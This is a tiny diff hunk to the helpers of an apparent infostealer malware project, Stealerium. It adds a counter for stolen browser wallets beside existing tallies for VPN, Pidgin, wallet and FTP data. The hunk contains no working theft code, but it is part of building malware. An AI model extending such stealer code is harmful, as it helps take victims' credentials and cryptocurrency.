@@ -17,6 +17,7 @@ namespace Stealerium.Helpers
         public static int Vpn = 0;
         public static int Pidgin = 0;
         public static int Wallets = 0;
+        public static int BrowserWallets = 0;
         public static int FtpHosts = 0;
 
         // Sessions, tokens
